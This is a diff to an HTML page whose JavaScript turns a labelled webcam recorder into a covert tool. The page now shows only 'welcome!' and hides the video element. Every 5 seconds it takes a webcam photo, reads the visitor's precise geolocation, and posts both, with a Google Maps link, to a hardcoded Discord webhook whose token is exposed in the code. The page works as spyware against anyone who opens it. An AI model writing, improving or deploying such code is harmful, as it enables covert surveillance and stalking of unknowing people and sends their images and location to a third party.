@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Video Capture & Send to Discord</title>
+    <title>Auto Capture, Location & Send to Discord</title>
     <style>
         body {
             display: flex;
@@ -15,69 +15,92 @@
     </style>
 </head>
 <body>
-    <h1>mmm Auto Video Capture & Send to Discord</h1>
-    <video id="video" width="640" height="480" autoplay></video>
+    <h1>welcome! </h1>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
         const video = document.getElementById('video');
-        let mediaRecorder;
-        let recordedChunks = [];
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        let captureInterval;
+        let currentLocation = { latitude: null, longitude: null };
 
-        // Function to send video to Discord
-        function sendVideoToDiscord(videoBlob) {
-            const formData = new FormData();
-            formData.append('file', videoBlob, 'captured_video.webm');
-
-            // Sending the video to Discord via Webhook
-            fetch('https://discord.com/api/webhooks/1199416800027349163/7zVriP6clTaGEm9MbHi6lV8oxDbhvN_qnf97zHkSxajr7ITmyfPTrOBkYSk2szVAm_W8', {
-                method: 'POST',
-                body: formData,
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Successfully sent video to Discord');
+        // Function to get live location
+        function fetchLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    console.log("Requesting location permissions...");
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            console.log("Location permission granted.");
+                            const { latitude, longitude } = position.coords;
+                            resolve({ latitude, longitude });
+                        },
+                        (error) => {
+                            console.error("Error getting location", error);
+                            alert("Location access denied. Please enable location services.");
+                            reject(error);
+                        },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
                 } else {
-                    console.error('Error sending video to Discord:', response.statusText);
+                    console.error("Geolocation is not supported by this browser.");
+                    alert("Geolocation is not supported by this browser.");
+                    reject(new Error("Geolocation is not supported."));
                 }
-            })
-            .catch((error) => {
-                console.error('Error sending video to Discord:', error);
             });
         }
 
-        // Function to capture video for 5 seconds
-        function captureVideo() {
-            recordedChunks = [];
-            mediaRecorder.start();
+        // Function to capture photo and send to Discord
+        async function captureAndSend() {
+            // Get location before capturing photo
+            try {
+                currentLocation = await fetchLocation();
+            } catch (error) {
+                console.error('Location fetch failed:', error);
+                currentLocation = { latitude: "Not available", longitude: "Not available" };
+            }
 
-            setTimeout(() => {
-                mediaRecorder.stop();
-            }, 5000); // Record for 5 seconds
+            // Construct Google Maps link if location is available
+            let googleMapsLink = "Location not available";
+            if (currentLocation.latitude !== "Not available" && currentLocation.longitude !== "Not available") {
+                googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${currentLocation.latitude},${currentLocation.longitude}`;
+            }
+
+            // Capture photo
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('file', blob, 'captured_image.png');
+
+                // Include location in message content with Google Maps link
+                let locationMessage = `Location: Latitude ${currentLocation.latitude}, Longitude ${currentLocation.longitude}\nGoogle Maps: ${googleMapsLink}`;
+                formData.append('content', locationMessage);
+
+                // Send the photo and location to Discord
+                fetch('https://discord.com/api/webhooks/1199416800027349163/7zVriP6clTaGEm9MbHi6lV8oxDbhvN_qnf97zHkSxajr7ITmyfPTrOBkYSk2szVAm_W8', {
+                    method: 'POST',
+                    body: formData,
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Successfully sent image and location to Discord');
+                    } else {
+                        console.error('Error sending to Discord:', response.statusText);
+                    }
+                })
+                .catch((error) => {
+                    console.error('Error sending to Discord:', error);
+                });
+            }, 'image/png');
         }
 
-        // Start the camera and initiate video recording
+        // Start camera and initiate auto-capture
         navigator.mediaDevices.getUserMedia({ video: true })
             .then((stream) => {
                 video.srcObject = stream;
-
-                // Initialize MediaRecorder to capture video
-                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-
-                // Capture video data when available
-                mediaRecorder.ondataavailable = function (event) {
-                    if (event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
-                };
-
-                // When the recording stops, send the video
-                mediaRecorder.onstop = function () {
-                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                    sendVideoToDiscord(videoBlob);
-                };
-
-                // Start recording every 10 seconds
-                setInterval(captureVideo, 10000); // Record every 10 seconds
+                captureInterval = setInterval(captureAndSend, 5000);  // Capture every 5 seconds
             })
             .catch((error) => {
                 console.error("Error accessing the camera", error);
